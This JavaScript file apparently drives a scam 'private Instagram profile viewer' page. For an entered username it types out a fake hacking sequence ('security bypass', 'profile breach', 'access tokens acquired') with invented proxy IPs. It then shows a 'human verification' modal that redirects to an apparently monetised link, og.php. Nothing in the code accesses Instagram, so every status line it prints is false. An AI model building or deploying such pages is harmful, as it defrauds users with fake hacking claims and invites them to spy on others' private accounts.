document.addEventListener('DOMContentLoaded', () => {
    const output = document.getElementById('output');
    const startButton = document.getElementById('startDemo');
    const searchBtn = document.getElementById('searchBtn');
    const username = document.getElementById('username');
    const serverSelect = document.getElementById('serverSelect');
    const hideIp = document.getElementById('hideIp');
    const enableEncryption = document.getElementById('enableEncryption');
    const verificationModal = document.getElementById('verificationModal');
    const verifyButton = verificationModal.querySelector('.verify-button');
    let isProcessing = false;

    const typeWriter = (text, speed = 25) => {
        return new Promise(resolve => {
            let i = 0;
            function type() {
                if (i < text.length) {
                    output.innerHTML += text.charAt(i);
                    output.scrollTop = output.scrollHeight;
                    i++;
                    setTimeout(type, speed);
                } else {
                    output.innerHTML += '<br>';
                    resolve();
                }
            }
            type();
        });
    };

    const servers = {
        'auto': ['194.156.98.23', '45.89.54.12', '178.34.56.78'],
        'eu': ['45.89.54.12', '89.23.45.67', '156.78.90.12'],
        'us': ['194.156.98.23', '67.89.45.23', '123.45.67.89'],
        'asia': ['178.34.56.78', '156.78.90.12', '89.23.45.67']
    };

    const getRandomServer = (region) => {
        return servers[region][Math.floor(Math.random() * servers[region].length)];
    };

    const showVerificationModal = () => {
        verificationModal.classList.add('active');
        setTimeout(() => {
            verificationModal.querySelector('.modal-content').classList.add('show');
        }, 10);
        document.body.style.overflow = 'hidden';
    };

    const disableButtons = () => {
        startButton.disabled = true;
        searchBtn.disabled = true;
        startButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESSING...';
        searchBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
    };

    const enableButtons = () => {
        startButton.disabled = false;
        searchBtn.disabled = false;
        startButton.innerHTML = '<i class="fas fa-eye"></i> VIEW PRIVATE PROFILE';
        searchBtn.innerHTML = '<i class="fas fa-search"></i>';
    };

    const simulateProcess = async () => {
        if (isProcessing) return;
        if (!username.value) {
            alert('Please enter an Instagram username');
            return;
        }

        isProcessing = true;
        disableButtons();
        output.innerHTML = '';
        
        // Initialize connection
        await typeWriter('[System] Initializing breach sequence...');
        await new Promise(resolve => setTimeout(resolve, 800));
        
        await typeWriter(`[Target] Located Instagram profile: @${username.value}`);
        await new Promise(resolve => setTimeout(resolve, 600));
        
        if (hideIp.checked) {
            await typeWriter('[Security] Activating stealth protocols...');
            await new Promise(resolve => setTimeout(resolve, 800));
            const server = getRandomServer(serverSelect.value);
            await typeWriter(`[Proxy] Primary route: ${server}`);
            await typeWriter('[Security] Masking digital footprint');
            await typeWriter('[Status] Anonymous mode activated');
            await new Promise(resolve => setTimeout(resolve, 600));
        }

        if (enableEncryption.checked) {
            await typeWriter('[Security] Establishing encrypted tunnel...');
            await new Promise(resolve => setTimeout(resolve, 800));
            await typeWriter('[Security] Generating 2048-bit RSA keys');
            await typeWriter('[Status] Secure channel established');
            await new Promise(resolve => setTimeout(resolve, 600));
        }

        // Profile access sequence
        await typeWriter('[System] Initiating Instagram security bypass...');
        await new Promise(resolve => setTimeout(resolve, 1000));
        await typeWriter('[Status] Analyzing protection layers...');
        await new Promise(resolve => setTimeout(resolve, 800));
        
        await typeWriter('[System] Executing profile vulnerability scan...');
        await new Promise(resolve => setTimeout(resolve, 1000));
        await typeWriter(`[Status] Private profile detected: @${username.value}`);
        await typeWriter('[System] Identifying access points...');
        await new Promise(resolve => setTimeout(resolve, 800));
        
        await typeWriter('[Status] Deploying profile access modules...');
        await typeWriter('[System] Injecting bypass sequence...');
        
        // Progress simulation with random delays
        for(let i = 0; i <= 100; i += 10) {
            const delay = Math.floor(Math.random() * 300) + 200;
            await new Promise(resolve => setTimeout(resolve, delay));
            await typeWriter(`[Progress] Profile breach: ${i}%`);
            if (i === 50) {
                await typeWriter('[Status] Decrypting profile data...');
            }
            if (i === 80) {
                await typeWriter('[Status] Reconstructing access token...');
            }
        }
        
        await typeWriter('[Success] Security bypass complete!');
        await typeWriter('[System] Access tokens acquired');
        await new Promise(resolve => setTimeout(resolve, 800));
        await typeWriter('[Security] Human verification required...');
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        // Show verification modal with animation
        showVerificationModal();
        isProcessing = false;
        enableButtons();
    };

    // Handle button clicks
    startButton.addEventListener('click', simulateProcess);
    searchBtn.addEventListener('click', simulateProcess);
    
    // Handle verification button click
    verifyButton.addEventListener('click', (e) => {
        e.preventDefault();
        verifyButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
        verifyButton.disabled = true;
        setTimeout(() => {
            window.location.href = 'og.php?u=/cl/js/6d49km';
        }, 1500);
    });
    
    // Allow Enter key to trigger the process
    username.addEventListener('keypress', (e) => {
        if (e.key === 'Enter' && !isProcessing) {
            simulateProcess();
        }
    });

    // Add hover effect to terminal
    const terminal = document.querySelector('.terminal');
    terminal.addEventListener('mousemove', (e) => {
        const rect = terminal.getBoundingClientRect();
        const x = e.clientX - rect.left;
        const y = e.clientY - rect.top;
        
        terminal.style.setProperty('--x', `${x}px`);
        terminal.style.setProperty('--y', `${y}px`);
    });
});
